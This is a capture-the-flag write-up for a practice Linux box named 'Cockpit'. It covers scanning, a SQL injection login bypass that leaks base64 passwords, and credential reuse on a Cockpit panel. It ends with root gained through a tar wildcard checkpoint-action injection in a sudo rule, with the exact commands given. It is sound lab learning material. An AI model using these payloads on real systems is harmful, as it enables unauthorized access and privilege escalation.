---
title: "Cockpit - Writeup"
linkTitle: "Cockpit"
weight: 11
featured: true
platform: "PG"
name: "Cockpit"
os: "Linux"
difficulty: "Medium"
release: "06 Jul 2026"
ip: "192.168.109.10"
# Drop a real avatar at static/img/pg/cockpit.png and uncomment:
# avatar: "/img/pg/cockpit.png"
tags: ["linux", "sqli-bypass", "cockpit", "credential-reuse", "tar-wildcard", "sudo"]
description: "Medium Linux box. A SQLi login bypass leaks base64 passwords, credential reuse opens a Cockpit management panel, and a wildcard-injectable sudo tar rule finishes the chain."
---

{{< htb name="Cockpit" os="Linux" difficulty="Medium" release="06 Jul 2026" ip="192.168.109.10" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 192.168.109.10
```

```
Open 192.168.109.10:22
Open 192.168.109.10:80
Open 192.168.109.10:9090
```

```
(root㉿kali)# nmap 192.168.109.10 -p22,80,9090 -sCV
```

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
9090/tcp open  http    Cockpit web service 198 - 220
```

Port 9090 running **Cockpit** is worth remembering, it's a full server management panel, effectively as valuable as SSH access if credentials for it turn up later.

## Enumeration

```
(root㉿kali)# ffuf -u "http://192.168.109.10/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -fw 1,9983 -e .php,html
```

```
img          [Status: 301]
login.php    [Status: 200]
css          [Status: 301]
js           [Status: 301]
```

A login page for the "blaze" app.

![Blaze login page](/img/pg/cockpit/01-login-page.png)

## Initial Foothold

The username field takes a classic SQLi bypass directly.

```
admin' #
```

Login succeeds with the injected username and any password. The dashboard that loads dumps every user's password, base64-encoded.

![Password dashboard leaking base64-encoded credentials for james and cameron](/img/pg/cockpit/02-password-dashboard.png)

```
(root㉿kali)# echo "Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=" | base64 -d
(root㉿kali)# echo "dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy" | base64 -d
```

```
canttouchhhthiss@455152
thisscanttbetouchedd@455152
```

Two real system passwords. Rather than guessing where they apply, try them against the other open service that clearly expects credentials, Cockpit on port 9090.

![Cockpit login screen accepting james's reused credentials](/img/pg/cockpit/03-cockpit-login.png)

James's password logs straight in.

![Cockpit system overview for host blaze](/img/pg/cockpit/04-cockpit-overview.png)

Cockpit ships a built-in terminal, no separate SSH session needed to explore further.

![Cockpit terminal showing sudo -l output for james](/img/pg/cockpit/05-cockpit-terminal-sudo.png)

```
james@blaze:~$ sudo -l
```

```
User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

## Privilege Escalation

The wildcard `*` in that sudoers rule is the classic tar injection point, filenames in the working directory that start with `--` get parsed as tar flags instead of file arguments.

```
cd /tmp
echo '/bin/bash -p' > shell.sh
chmod +x shell.sh

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

`tar` expands the wildcard, picks up the two crafted filenames as options, and runs `shell.sh` through its checkpoint-action feature, as root.

```
cat /root/proof.txt
```

```
e0bc2310a32689efddf23b9beba77a86
```

## Lessons learned

- Fuzz with extensions even when the site doesn't visibly look PHP-based. `login.php` here wouldn't have shown up without `-e .php,html` on the wordlist.
- searchsploit isn't always the answer. A basic SQLi bypass on the login form solved this box faster than any exploit-db search would have.
- Any login page deserves the same quick triage every time, default creds first, then a SQLi bypass attempt, then searchsploit if both fail.
- Credential reuse across services is worth testing by default. A password leaked from one app opened a completely separate management panel here, always try found creds everywhere, not just where they were found.
- `sudo -l` with a wildcard in the allowed command is a direct privesc path, not just a minor detail. Recognize `*` in a sudoers rule immediately and check GTFOBins for the specific binary.
